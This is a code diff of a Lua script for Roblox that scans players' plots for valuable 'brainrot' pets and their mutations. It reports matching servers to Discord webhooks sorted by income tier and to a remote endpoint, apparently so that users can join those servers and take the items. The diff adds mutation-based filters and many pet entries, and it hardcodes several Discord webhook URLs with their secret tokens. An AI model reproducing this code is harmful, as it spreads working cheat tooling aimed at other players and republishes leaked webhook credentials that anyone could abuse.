@@ -1,3 +1,4 @@
+
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
@@ -54,234 +55,248 @@ end
 
 -- ⚙️ WEBHOOK SETTINGS BY INCOME RANGE
 local WEBHOOKS = {
-{ -- 1M/s - 25M/s
-url = 'https://discord.com/api/webhooks/1454372752034365566/EmLdd5U_wxp6Ziy8gAAiGB7MHpeWPaDBZzS8vfAQSD2dWsB0ZyPAEfDYK0n869ObblnT',
-title = '🟢 Low Income (1-25M/s)',
-color = 0x00ff00,
-min = 1_000_000,
-max = 25_000_000,
-sendServerInfo = false,
-sendTeleport = true
-},
-{ -- 26M/s - 100M/s (основной, без Server Info)
-url = 'https://discord.com/api/webhooks/1456399330662682714/1HTEJNBTO1qhXMex8-5YBB1_Q5ekmyHtgvUJ886zitqpl6IC_aXhjKb5QgpjXns1s4uh',
-title = '🟡 Medium Income (26-100M/s)',
-color = 0xffff00,
-min = 26_000_000,
-max = 100_000_000,
-sendServerInfo = false,
-sendTeleport = false,
-showJoinerAd = true
-},
-{ -- 101M/s - 10000M/s (основной, без Server Info)
-url = 'https://discord.com/api/webhooks/1456399389336801463/kyZ8kGtNnSL3Ee1YJteiCWdKWA_KlVFdUNEVAAWr9_kkwGJc6r-3Xg7D8w56aUxRfa1q',
-title = '🔴 High Income (101M+ /s)',
-color = 0xff0000,
-min = 101_000_000,
-max = 10_000_000_000,
-sendServerInfo = false,
-sendTeleport = false,
-showJoinerAd = true
-},
-{ -- Special brainrots + overpay
-url = 'https://discord.com/api/webhooks/1454490244421259315/wpQdFzNME9WIlCp65GmB3jc3fuSZ6-U9-JwNA3JVkcoo_Eu5qARvMRvPChV5X15sLdK_',
-title = '⭐️ SPECIAL BRAINROTS',
-color = 0xff00ff,
-special = true,
-sendServerInfo = false,
-sendTeleport = true
-}
+    { -- 1M/s - 25M/s
+        url = 'https://discord.com/api/webhooks/1454372752034365566/EmLdd5U_wxp6Ziy8gAAiGB7MHpeWPaDBZzS8vfAQSD2dWsB0ZyPAEfDYK0n869ObblnT',
+        title = '🟢 Low Income (1-25M/s)',
+        color = 0x00ff00,
+        min = 1_000_000,
+        max = 25_000_000,
+        sendServerInfo = false,
+        sendTeleport = true
+    },
+    { -- 26M/s - 100M/s (основной, без Server Info)
+        url = 'https://discord.com/api/webhooks/1456399330662682714/1HTEJNBTO1qhXMex8-5YBB1_Q5ekmyHtgvUJ886zitqpl6IC_aXhjKb5QgpjXns1s4uh',
+        title = '🟡 Medium Income (26-100M/s)',
+        color = 0xffff00,
+        min = 26_000_000,
+        max = 100_000_000,
+        sendServerInfo = false,
+        sendTeleport = false,
+        showJoinerAd = true
+    },
+    { -- 101M/s - 10000M/s (основной, без Server Info)
+        url = 'https://discord.com/api/webhooks/1456399389336801463/kyZ8kGtNnSL3Ee1YJteiCWdKWA_KlVFdUNEVAAWr9_kkwGJc6r-3Xg7D8w56aUxRfa1q',
+        title = '🔴 High Income (101M+ /s)',
+        color = 0xff0000,
+        min = 101_000_000,
+        max = 10_000_000_000,
+        sendServerInfo = false,
+        sendTeleport = false,
+        showJoinerAd = true
+    },
+    { -- Special brainrots + overpay + mutations
+        url = 'https://discord.com/api/webhooks/1454490244421259315/wpQdFzNME9WIlCp65GmB3jc3fuSZ6-U9-JwNA3JVkcoo_Eu5qARvMRvPChV5X15sLdK_',
+        title = '⭐️ SPECIAL BRAINROTS + MUTATIONS',
+        color = 0xff00ff,
+        special = true,
+        sendServerInfo = false,
+        sendTeleport = true
+    }
 }
 
--- 📋 SPECIAL BRAINROTS WITH MIN VALUES
+-- 📋 SPECIAL BRAINROTS WITH MIN VALUES + MUTATIONS
 local SPECIAL_BRAINROTS = {
-['Garama and Madundung'] = 0,
-['Dragon Cannelloni'] = 0,
-['La Supreme Combinasion'] = 0,
-['Ketupat Kepat'] = 315_000_000,
-['Strawberry Elephant'] = 0,
-['Ketchuru and Musturu'] = 255_000_000,
-['Tralaledon'] = 100_000_000,
-['Tictac Sahur'] = 250_000_000,
-['Burguro And Fryuro'] = 0,
-['La Secret Combinasion'] = 0,
-['Spooky and Pumpky'] = 0,
-['Meowl'] = 0,
-['La Casa Boo'] = 0,
-['Headless Horseman'] = 0,
-['Los Tacoritas'] = 0,
-['Capitano Moby'] = 0,
-['Cooki and Milki'] = 0,
-['Fragrama and Chocrama'] = 0,
-['Guest 666'] = 0,
-['Fishino Clownino'] = 0,
-['Tacorita Bicicleta'] = 250_000_000,
-['La Jolly Grande'] = 350_000_000,
-['W or L'] = 390_000_000,
-['Los Puggies'] = 400_000_000,
-['La Taco Combinasion'] = 450_000_000,
-['Chipso and Queso'] = 260_000_000,
-['Mieteteira Bicicleteira'] = 500_000_000,
-['Los Mobilis'] = 500_000_000,
-['La Spooky Grande'] = 300_000_000,
-['Eviledon'] = 400_000_000,
-['Chillin Chili'] = 25_000_000,
-['Money Money Puggy'] = 210_000_000,
-['Tang Tang Keletang'] = 260_000_000,
-['Los Primos'] = 0,
-['Orcaledon'] = 320_000_000,
-['Las Sis'] = 300_000_000,
-['La Extinct Grande'] = 300_000_000,
-['Los Bros'] = 280_000_000,
-['Spaghetti Tualetti'] = 420_000_000,
-['Esok Sekolah'] = 450_000_000,
-['Nuclearo Dinossauro'] = 250_000_000,
-['Lavadorito Spinito'] = 250_000_000,
-['La Ginger Sekolah'] = 225_000_000,
-['Reinito Sleighito'] = 0,
-['Dragon Gingerini'] = 0,
-['Festive 67'] = 0,
-['Ginger Gerat'] = 0,
-['Jolly Jolly Sahur'] = 0,
-['Skibidi Toilet'] = 0,
+    ['Garama and Madundung'] = { min = 250_000_000, mutations = {"Bloodrot", "Candy", "Lava"} },
+    ['Dragon Cannelloni'] = { min = 0, mutations = {} },
+    ['La Supreme Combinasion'] = { min = 0, mutations = {} },
+    ['Ketupat Kepat'] = { min = 595_000_000, mutations = {"Yin Yang"} },
+    ['Strawberry Elephant'] = { min = 0, mutations = {} },
+    ['Ketchuru and Musturu'] = { min = 550_000_000, mutations = {"Bloodrot", "Candy", "Lava", "Yin Yang"} },
+    ['Tralaledon'] = { min = 400_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Tictac Sahur'] = { min = 525_000_000, mutations = {"Bloodrot", "Candy", "Lava", "Yin Yang", "Galaxy"} },
+    ['Burguro And Fryuro'] = { min = 0, mutations = {} },
+    ['La Secret Combinasion'] = { min = 625_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Spooky and Pumpky'] = { min = 0, mutations = {} },
+    ['Meowl'] = { min = 0, mutations = {} },
+    ['La Casa Boo'] = { min = 0, mutations = {} },
+    ['Headless Horseman'] = { min = 0, mutations = {} },
+    ['Los Tacoritas'] = { min = 400_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Capitano Moby'] = { min = 0, mutations = {} },
+    ['Cooki and Milki'] = { min = 0, mutations = {"Shiny"} },
+    ['Fragrama and Chocrama'] = { min = 0, mutations = {} },
+    ['Guest 666'] = { min = 100_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Fishino Clownino'] = { min = 0, mutations = {} },
+    ['Tacorita Bicicleta'] = { min = 300_000_000, mutations = {"Lava"} },
+    ['La Jolly Grande'] = { min = 600_000_000, mutations = {} },
+    ['W or L'] = { min = 600_000_000, mutations = {"Candy", "Lava", "BloodRot", "Rainbow"} },
+    ['Los Puggies'] = { min = 600_000_000, mutations = {"Rainbow"} },
+    ['La Taco Combinasion'] = { min = 700_000_000, mutations = {"Candy", "Rainbow", "Galaxy"} },
+    ['Chipso and Queso'] = { min = 600_000_000, mutations = {"Candy"} },
+    ['Mieteteira Bicicleteira'] = { min = 700_000_000, mutations = {} },
+    ['Los Mobilis'] = { min = 550_000_000, mutations = {} },
+    ['La Spooky Grande'] = { min = 600_000_000, mutations = {} },
+    ['Eviledon'] = { min = 600_000_000, mutations = {"Rainbow"} },
+    ['Chillin Chili'] = { min = 700_000_000, mutations = {"Candy"} },
+    ['Money Money Puggy'] = { min = 460_000_000, mutations = {"Bloodrot"} },
+    ['Tang Tang Keletang'] = { min = 550_000_000, mutations = {"Yin Yang"} },
+    ['Los Primos'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Orcaledon'] = { min = 500_000_000, mutations = {"Candy", "Lava", "Rainbow", "Galaxy"} },
+    ['Las Sis'] = { min = 500_000_000, mutations = {"Candy", "Lava"} },
+    ['La Extinct Grande'] = { min = 400_000_000, mutations = {} },
+    ['Los Bros'] = { min = 500_000_000, mutations = {"Candy", "Lava", "Rainbow"} },
+    ['Spaghetti Tualetti'] = { min = 500_000_000, mutations = {"Bloodrot", "Rainbow"} },
+    ['Esok Sekolah'] = { min = 600_000_000, mutations = {} },
+    ['Nuclearo Dinossauro'] = { min = 300_000_000, mutations = {"Cursed", "Bloodrot"} },
+    ['Lavadorito Spinito'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['La Ginger Sekolah'] = { min = 600_000_000, mutations = {"Cursed", "Candy", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Reinito Sleighito'] = { min = 0, mutations = {} },
+    ['Dragon Gingerini'] = { min = 0, mutations = {} },
+    ['Festive 67'] = { min = 0, mutations = {} },
+    ['Ginger Gerat'] = { min = 0, mutations = {} },
+    ['Jolly Jolly Sahur'] = { min = 250_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Skibidi Toilet'] = { min = 0, mutations = {} },
+    ['Tuff Toucan'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
+    ['Cerberus'] = { min = 0, mutations = {} },
+    ['Ay Mi Gatito'] = { min = 0, mutations = {} },
+    ['BRUNITO MARSITO'] = { min = 0, mutations = {} },
+    ['AY MI GATITO MIAU MIAU'] = { min = 0, mutations = {} },
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
 local OBJECTS = {
-['La Vacca Saturno Saturnita'] = { emoji = '🐄', important = false },
-['Chimpanzini Spiderini'] = { emoji = '🕷️', important = false },
-['Los Tralaleritos'] = { emoji = '🎵', important = false },
-['Las Tralaleritas'] = { emoji = '🎶', important = false },
-['Graipuss Medussi'] = { emoji = '🐍', important = false },
-['Torrtuginni Dragonfrutini'] = { emoji = '🐢', important = false },
-['Pot Hotspot'] = { emoji = '🔥', important = false },
-['La Grande Combinasion'] = { emoji = '🌟', important = true },
-['Garama and Madundung'] = { emoji = '🍝', important = true },
-['Secret Lucky Block'] = { emoji = '🎲', important = false },
-['Dragon Cannelloni'] = { emoji = '🐲', important = true },
-['Nuclearo Dinossauro'] = { emoji = '☢️', important = true },
-['Las Vaquitas Saturnitas'] = { emoji = '🐮', important = false },
-['Agarrini la Palini'] = { emoji = '🤹', important = false },
-['Los Hotspotsitos'] = { emoji = '⚡', important = true },
-['Esok Sekolah'] = { emoji = '🏫', important = true },
-['Nooo My Hotspot'] = { emoji = '📶', important = false },
-['La Supreme Combinasion'] = { emoji = '👑', important = true },
-['Admin Lucky Block'] = { emoji = '🔒', important = false },
-['Ketupat Kepat'] = { emoji = '🍙', important = true },
-['Strawberry Elephant'] = { emoji = '🐘', important = true },
-['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
-['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
-['La Secret Combinasion'] = { emoji = '🕵️', important = true },
-['La Karkerkar Combinasion'] = { emoji = '🤖', important = false },
-['Los Bros'] = { emoji = '👊', important = true },
-['La Extinct Grande'] = { emoji = '💀', important = true },
-['Las Sis'] = { emoji = '👭', important = true },
-['Tacorita Bicicleta'] = { emoji = '🌮', important = true },
-['Tictac Sahur'] = { emoji = '⏰', important = true },
-['Celularcini Viciosini'] = { emoji = '📱', important = true },
-['Los Primos'] = { emoji = '👬', important = true },
-['Tang Tang Keletang'] = { emoji = '🥁', important = true },
-['Money Money Puggy'] = { emoji = '💰', important = true },
-['Burguro And Fryuro'] = { emoji = '🍔', important = true },
-['Chillin Chili'] = { emoji = '🌶️', important = true },
-['Eviledon'] = { emoji = '😈', important = true },
-['La Spooky Grande'] = { emoji = '👻', important = true },
-['Los Mobilis'] = { emoji = '🚗', important = true },
-['Spooky and Pumpky'] = { emoji = '🎃', important = true },
-['Mieteteira Bicicleteira'] = { emoji = '🚴', important = true },
-['Meowl'] = { emoji = '🐱', important = true },
-['Chipso and Queso'] = { emoji = '🧀', important = true },
-['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
-['Headless Horseman'] = { emoji = '👹', important = true },
-['Mariachi Corazoni'] = { emoji = '🎺', important = true },
-['La Taco Combinasion'] = { emoji = '🌮', important = true },
-['Capitano Moby'] = { emoji = '⚓', important = true },
-['Guest 666'] = { emoji = '🔥', important = true },
-['Cooki and Milki'] = { emoji = '🍪', important = true },
-['Los Puggies'] = { emoji = '🐶', important = true },
-['Fragrama and Chocrama'] = { emoji = '🍫', important = true },
-['Los Spaghettis'] = { emoji = '🍝', important = true },
-['Los Tacoritas'] = { emoji = '🌮', important = true },
-['Orcaledon'] = { emoji = '🐋', important = true },
-['Lavadorito Spinito'] = { emoji = '🌀', important = true },
-['Los Planitos'] = { emoji = '🛫', important = true },
-['W or L'] = { emoji = '🏆', important = true },
-['Fishino Clownino'] = { emoji = '🐠', important = true },
-['Chicleteira Noelteira'] = { emoji = '🍬', important = true },
-['La Jolly Grande'] = { emoji = '🎁', important = true },
-['Los Chicleteiras'] = { emoji = '🍭', important = true },
-['Gobblino Uniciclino'] = { emoji = '🦃', important = true },
-['Los 67'] = { emoji = '🎰', important = true },
-['Los Spooky Combinasionas'] = { emoji = '💀', important = true },
-['Swag Soda'] = { emoji = '🥤', important = true },
-['Los Combinasionas'] = { emoji = '🧩', important = true },
-['Los Burritos'] = { emoji = '🌯', important = true },
-['67'] = { emoji = '🎲', important = true },
-['Rang Ring Bus'] = { emoji = '🚌', important = true },
-['Los Nooo My Hotspotsitos'] = { emoji = '📡', important = true },
-['Chicleteirina Bicicleteirina'] = { emoji = '🚲', important = true },
-['Noo My Candy'] = { emoji = '🍬', important = true },
-['Los Quesadillas'] = { emoji = '🫓', important = true },
-['Quesadillo Vampiro'] = { emoji = '🧛', important = true },
-['Quesadilla Crocodila'] = { emoji = '🐊', important = true },
-['Ho Ho Ho Sahur'] = { emoji = '🎅', important = true },
-['Horegini Boom'] = { emoji = '💥', important = true },
-['Pot Pumpkin'] = { emoji = '🎃', important = true },
-['Pirulitoita Bicicleteira'] = { emoji = '🍭', important = true },
-['La Sahur Combinasion'] = { emoji = '🌙', important = true },
-['List List List Sahur'] = { emoji = '📋', important = true },
-['Noo My Examine'] = { emoji = '📘', important = true },
-['Cuadramat and Pakrahmatmamat'] = { emoji = '🧮', important = true },
-['Los Cucarachas'] = { emoji = '🪳', important = true },
-['1x1x1x1'] = { emoji = '💾', important = true },
-['La Ginger Sekolah'] = { emoji = '🎁', important = true },
-['Reinito Sleighito'] = { emoji = '🦌', important = true },
-['Swaggy Bros'] = { emoji = '🥤', important = true },
-['Gingerbread Dragon'] = { emoji = '🥠', important = true },
-['Naughty Naughty'] = { emoji = '🦥', important = true },
-['Chimnino'] = { emoji = '🌽', important = true },
-['Noo my Present'] = { emoji = '🎁', important = true },
-['Los Candies'] = { emoji = '🍬', important = true },
-['Santa Hotspot'] = { emoji = '🎄', important = true },
-['Festive 67'] = { emoji = '🎄', important = true },
-['Burrito Bandito'] = { emoji = '🌯', important = true },
-['Perrito Burrito'] = { emoji = '🐶', important = true },
-['Trickolino'] = { emoji = '😢', important = true },
-['La Vacca Jacko Linterino'] = { emoji = '🎃', important = true },
-['Los Karkeritos'] = { emoji = '🪑', important = true },
-['Karker Sahur'] = { emoji = '🥁', important = true },
-['job job job Sahur'] = { emoji = '📜', important = true },
-['Frankentteo'] = { emoji = '🧟', important = true },
-['Pumpkini Spyderini'] = { emoji = '🎃', important = true },
-['Yess My Examine'] = { emoji = '✅', important = true },
-['Guerriro Digitale'] = { emoji = '⌨️', important = true },
-['Boatito Auratito'] = { emoji = '🚤', important = true },
-['Los Tortus'] = { emoji = '🐢', important = true },
-['Zombie Tralala'] = { emoji = '🧟', important = true },
-['Vulturino Skeletono'] = { emoji = '🦅', important = true },
-['La Cucaracha'] = { emoji = '🪳', important = true },
-['Extinct Tralalero'] = { emoji = '🦴', important = true },
-['Fragola La La La'] = { emoji = '🍓', important = true },
-['Los Spyderinis'] = { emoji = '🕷', important = true },
-['Blackhole Goat'] = { emoji = '🐐', important = true },
-['Chachechi'] = { emoji = '🗣', important = true },
-['Dul Dul Dul'] = { emoji = '🐒', important = true },
-['Sammyni Spyderini'] = { emoji = '🕷', important = true },
-['Jackorilla'] = { emoji = '🦍', important = true },
-['Trenostruzzo Turbo 4000'] = { emoji = '🚄', important = true },
-['Karkerkar Kurkur'] = { emoji = '🪑', important = true },
-['Los Matteos'] = { emoji = '🕶', important = true },
-['Bisonte Giuppitere'] = { emoji = '🦬', important = true },
-['Los 25'] = { emoji = '💀', important = true },
-['25'] = { emoji = '💄', important = true },
-['Dragon Gingerini'] = { emoji = '🐍', important = true },
-['Donkeyturbo Express'] = { emoji = '🍩', important = true },
-['Festive 67'] = { emoji = '6️⃣', important = true },
-['Money Money Reindeer'] = { emoji = '💶', important = true },
-['Jolly Jolly Sahur'] = { emoji = '🥶', important = true },
-['Los Jolly Combinasionas'] = { emoji = '🗽', important = true },
-['Ginger Gerat'] = { emoji = '🥶', important = true },
-['Skibidi Toilet'] = { emoji = '🥶', important = true },  
+    ['La Vacca Saturno Saturnita'] = { emoji = '🐄', important = false },
+    ['Chimpanzini Spiderini'] = { emoji = '🕷️', important = false },
+    ['Los Tralaleritos'] = { emoji = '🎵', important = false },
+    ['Las Tralaleritas'] = { emoji = '🎶', important = false },
+    ['Graipuss Medussi'] = { emoji = '🐍', important = false },
+    ['Torrtuginni Dragonfrutini'] = { emoji = '🐢', important = false },
+    ['Pot Hotspot'] = { emoji = '🔥', important = false },
+    ['La Grande Combinasion'] = { emoji = '🌟', important = true },
+    ['Garama and Madundung'] = { emoji = '🍝', important = true },
+    ['Secret Lucky Block'] = { emoji = '🎲', important = false },
+    ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
+    ['Nuclearo Dinossauro'] = { emoji = '☢️', important = true },
+    ['Las Vaquitas Saturnitas'] = { emoji = '🐮', important = false },
+    ['Agarrini la Palini'] = { emoji = '🤹', important = false },
+    ['Los Hotspotsitos'] = { emoji = '⚡', important = true },
+    ['Esok Sekolah'] = { emoji = '🏫', important = true },
+    ['Nooo My Hotspot'] = { emoji = '📶', important = false },
+    ['La Supreme Combinasion'] = { emoji = '👑', important = true },
+    ['Admin Lucky Block'] = { emoji = '🔒', important = false },
+    ['Ketupat Kepat'] = { emoji = '🍙', important = true },
+    ['Strawberry Elephant'] = { emoji = '🐘', important = true },
+    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
+    ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
+    ['La Secret Combinasion'] = { emoji = '🕵️', important = true },
+    ['La Karkerkar Combinasion'] = { emoji = '🤖', important = false },
+    ['Los Bros'] = { emoji = '👊', important = true },
+    ['La Extinct Grande'] = { emoji = '💀', important = true },
+    ['Las Sis'] = { emoji = '👭', important = true },
+    ['Tacorita Bicicleta'] = { emoji = '🌮', important = true },
+    ['Tictac Sahur'] = { emoji = '⏰', important = true },
+    ['Celularcini Viciosini'] = { emoji = '📱', important = true },
+    ['Los Primos'] = { emoji = '👬', important = true },
+    ['Tang Tang Keletang'] = { emoji = '🥁', important = true },
+    ['Money Money Puggy'] = { emoji = '💰', important = true },
+    ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
+    ['Chillin Chili'] = { emoji = '🌶️', important = true },
+    ['Eviledon'] = { emoji = '😈', important = true },
+    ['La Spooky Grande'] = { emoji = '👻', important = true },
+    ['Los Mobilis'] = { emoji = '🚗', important = true },
+    ['Spooky and Pumpky'] = { emoji = '🎃', important = true },
+    ['Mieteteira Bicicleteira'] = { emoji = '🚴', important = true },
+    ['Meowl'] = { emoji = '🐱', important = true },
+    ['Chipso and Queso'] = { emoji = '🧀', important = true },
+    ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
+    ['Headless Horseman'] = { emoji = '👹', important = true },
+    ['Mariachi Corazoni'] = { emoji = '🎺', important = true },
+    ['La Taco Combinasion'] = { emoji = '🌮', important = true },
+    ['Capitano Moby'] = { emoji = '⚓', important = true },
+    ['Guest 666'] = { emoji = '🔥', important = true },
+    ['Cooki and Milki'] = { emoji = '🍪', important = true },
+    ['Los Puggies'] = { emoji = '🐶', important = true },
+    ['Fragrama and Chocrama'] = { emoji = '🍫', important = true },
+    ['Los Spaghettis'] = { emoji = '🍝', important = true },
+    ['Los Tacoritas'] = { emoji = '🌮', important = true },
+    ['Orcaledon'] = { emoji = '🐋', important = true },
+    ['Lavadorito Spinito'] = { emoji = '🌀', important = true },
+    ['Los Planitos'] = { emoji = '🛫', important = true },
+    ['W or L'] = { emoji = '🏆', important = true },
+    ['Fishino Clownino'] = { emoji = '🐠', important = true },
+    ['Chicleteira Noelteira'] = { emoji = '🍬', important = true },
+    ['La Jolly Grande'] = { emoji = '🎁', important = true },
+    ['Los Chicleteiras'] = { emoji = '🍭', important = true },
+    ['Gobblino Uniciclino'] = { emoji = '🦃', important = true },
+    ['Los 67'] = { emoji = '🎰', important = true },
+    ['Los Spooky Combinasionas'] = { emoji = '💀', important = true },
+    ['Swag Soda'] = { emoji = '🥤', important = true },
+    ['Los Combinasionas'] = { emoji = '🧩', important = true },
+    ['Los Burritos'] = { emoji = '🌯', important = true },
+    ['67'] = { emoji = '🎲', important = true },
+    ['Rang Ring Bus'] = { emoji = '🚌', important = true },
+    ['Los Nooo My Hotspotsitos'] = { emoji = '📡', important = true },
+    ['Chicleteirina Bicicleteirina'] = { emoji = '🚲', important = true },
+    ['Noo My Candy'] = { emoji = '🍬', important = true },
+    ['Los Quesadillas'] = { emoji = '🫓', important = true },
+    ['Quesadillo Vampiro'] = { emoji = '🧛', important = true },
+    ['Quesadilla Crocodila'] = { emoji = '🐊', important = true },
+    ['Ho Ho Ho Sahur'] = { emoji = '🎅', important = true },
+    ['Horegini Boom'] = { emoji = '💥', important = true },
+    ['Pot Pumpkin'] = { emoji = '🎃', important = true },
+    ['Pirulitoita Bicicleteira'] = { emoji = '🍭', important = true },
+    ['La Sahur Combinasion'] = { emoji = '🌙', important = true },
+    ['List List List Sahur'] = { emoji = '📋', important = true },
+    ['Noo My Examine'] = { emoji = '📘', important = true },
+    ['Cuadramat and Pakrahmatmamat'] = { emoji = '🧮', important = true },
+    ['Los Cucarachas'] = { emoji = '🪳', important = true },
+    ['1x1x1x1'] = { emoji = '💾', important = true },
+    ['La Ginger Sekolah'] = { emoji = '🎁', important = true },
+    ['Reinito Sleighito'] = { emoji = '🦌', important = true },
+    ['Swaggy Bros'] = { emoji = '🥤', important = true },
+    ['Gingerbread Dragon'] = { emoji = '🥠', important = true },
+    ['Naughty Naughty'] = { emoji = '🦥', important = true },
+    ['Chimnino'] = { emoji = '🌽', important = true },
+    ['Noo my Present'] = { emoji = '🎁', important = true },
+    ['Los Candies'] = { emoji = '🍬', important = true },
+    ['Santa Hotspot'] = { emoji = '🎄', important = true },
+    ['Festive 67'] = { emoji = '🎄', important = true },
+    ['Burrito Bandito'] = { emoji = '🌯', important = true },
+    ['Perrito Burrito'] = { emoji = '🐶', important = true },
+    ['Trickolino'] = { emoji = '😢', important = true },
+    ['La Vacca Jacko Linterino'] = { emoji = '🎃', important = true },
+    ['Los Karkeritos'] = { emoji = '🪑', important = true },
+    ['Karker Sahur'] = { emoji = '🥁', important = true },
+    ['job job job Sahur'] = { emoji = '📜', important = true },
+    ['Frankentteo'] = { emoji = '🧟', important = true },
+    ['Pumpkini Spyderini'] = { emoji = '🎃', important = true },
+    ['Yess My Examine'] = { emoji = '✅', important = true },
+    ['Guerriro Digitale'] = { emoji = '⌨️', important = true },
+    ['Boatito Auratito'] = { emoji = '🚤', important = true },
+    ['Los Tortus'] = { emoji = '🐢', important = true },
+    ['Zombie Tralala'] = { emoji = '🧟', important = true },
+    ['Vulturino Skeletono'] = { emoji = '🦅', important = true },
+    ['La Cucaracha'] = { emoji = '🪳', important = true },
+    ['Extinct Tralalero'] = { emoji = '🦴', important = true },
+    ['Fragola La La La'] = { emoji = '🍓', important = true },
+    ['Los Spyderinis'] = { emoji = '🕷', important = true },
+    ['Blackhole Goat'] = { emoji = '🐐', important = true },
+    ['Chachechi'] = { emoji = '🗣', important = true },
+    ['Dul Dul Dul'] = { emoji = '🐒', important = true },
+    ['Sammyni Spyderini'] = { emoji = '🕷', important = true },
+    ['Jackorilla'] = { emoji = '🦍', important = true },
+    ['Trenostruzzo Turbo 4000'] = { emoji = '🚄', important = true },
+    ['Karkerkar Kurkur'] = { emoji = '🪑', important = true },
+    ['Los Matteos'] = { emoji = '🕶', important = true },
+    ['Bisonte Giuppitere'] = { emoji = '🦬', important = true },
+    ['Los 25'] = { emoji = '💀', important = true },
+    ['25'] = { emoji = '💄', important = true },
+    ['Dragon Gingerini'] = { emoji = '🐍', important = true },
+    ['Donkeyturbo Express'] = { emoji = '🍩', important = true },
+    ['Money Money Reindeer'] = { emoji = '💶', important = true },
+    ['Jolly Jolly Sahur'] = { emoji = '🥶', important = true },
+    ['Los Jolly Combinasionas'] = { emoji = '🗽', important = true },
+    ['Ginger Gerat'] = { emoji = '🥶', important = true },
+    ['Skibidi Toilet'] = { emoji = '🚽', important = true },
+    ['Tuff Toucan'] = { emoji = '🦜', important = true },
+    ['Bunito Bunito Spinito'] = { emoji = '🐰', important = true },
+    ['Tung Tung Tung Sahur'] = { emoji = '🌳', important = true },
+    ['Bunnyman'] = { emoji = '🐇', important = true },
+    ['Please my Present'] = { emoji = '🎁', important = true },
+    ['Giftini Spyderini'] = { emoji = '🕷', important = true },
+    ['Cerberus'] = { emoji = '👹', important = true },
+    ['Ay Mi Gatito'] = { emoji = '😻', important = true },
+    ['BRUNITO MARSITO'] = { emoji = '🥸', important = true },
+    ['AY MI GATITO MIAU MIAU'] = { emoji = '😻', important = true },
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -289,6 +304,31 @@ for name, cfg in pairs(OBJECTS) do
     if cfg.important then
         ALWAYS_IMPORTANT[name] = true
     end
+end
+
+-- 🔍 ПОИСК МУТАЦИЙ У ПИТОМЦЕВ
+local function findAllPetMutations()
+    local plots = workspace.Plots:GetChildren()
+    local petMutations = {}
+    
+    for _, plot in ipairs(plots) do
+        if plot:IsA("Folder") or plot:IsA("Model") then
+            for _, descendant in ipairs(plot:GetDescendants()) do
+                if descendant:IsA("Model") and descendant:GetAttribute("Mutation") then
+                    local petInfo = {
+                        PlotId = plot.Name,
+                        PetName = descendant.Name,
+                        Mutation = descendant:GetAttribute("Mutation")
+                    }
+                    
+                    table.insert(petMutations, petInfo)
+                    print(string.format("[%s] %s: %s", plot.Name, descendant.Name, tostring(descendant:GetAttribute("Mutation"))))
+                end
+            end
+        end
+    end
+    
+    return petMutations
 end
 
 local function parseGenerationText(s)
@@ -346,8 +386,8 @@ local function getOverheadInfo(animalOverhead)
 
     if not name then
         local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
-        or animalOverhead:FindFirstChildOfClass('TextButton')
-        or animalOverhead:FindFirstChildOfClass('TextBox')
+            or animalOverhead:FindFirstChildOfClass('TextButton')
+            or animalOverhead:FindFirstChildOfClass('TextBox')
         name = anyText and grabText(anyText) or nil
     end
 
@@ -519,9 +559,37 @@ local function shouldShow(name, gen)
     return (type(gen) == 'number') and gen >= 1_000_000
 end
 
-local function isSpecialBrainrot(name, gen)
-    local minValue = SPECIAL_BRAINROTS[name]
-    if not minValue then return false end
+-- ✨ НОВАЯ ФУНКЦИЯ: проверка мутаций
+local function hasRequiredMutation(name, mutation)
+    local brainrotConfig = SPECIAL_BRAINROTS[name]
+    if not brainrotConfig then return false end
+    
+    local mutations = brainrotConfig.mutations or {}
+    if #mutations == 0 then return false end
+    
+    for _, requiredMutation in ipairs(mutations) do
+        if mutation == requiredMutation then
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- ✨ ОБНОВЛЁННАЯ: проверка special brainrot с учётом мутаций
+local function isSpecialBrainrot(name, gen, mutation)
+    local brainrotConfig = SPECIAL_BRAINROTS[name]
+    if not brainrotConfig then return false end
+    
+    local minValue = brainrotConfig.min
+    local mutations = brainrotConfig.mutations or {}
+    
+    -- Если есть подходящая мутация, отправляем независимо от числа
+    if mutation and hasRequiredMutation(name, mutation) then
+        return true
+    end
+    
+    -- Иначе проверяем минимальное значение
     return gen >= minValue
 end
 
@@ -602,7 +670,7 @@ local function sendToVDS(filteredObjects, webhookConfig)
     local encryptedJobId = EncryptJobId(tostring(game.JobId))
 
     local payload = {
-        jobId = encryptedJobId,  -- 🔐 Шифрованный JobId
+        jobId = encryptedJobId, -- 🔐 Шифрованный JobId
         placeId = game.PlaceId,
         title = webhookConfig.title,
         color = webhookConfig.color,
